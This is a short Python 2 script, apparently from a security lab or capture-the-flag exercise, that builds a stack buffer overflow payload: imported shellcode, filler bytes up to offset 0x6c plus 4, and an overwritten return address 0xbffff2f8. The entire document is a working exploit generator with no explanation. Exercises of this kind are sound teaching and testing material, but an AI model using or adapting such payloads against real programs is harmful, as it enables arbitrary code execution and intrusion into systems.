from struct import pack
from shellcode import shellcode

print shellcode + "\x01" * (0x6c - len(shellcode) + 4) + pack("<I",0xbffff2f8)
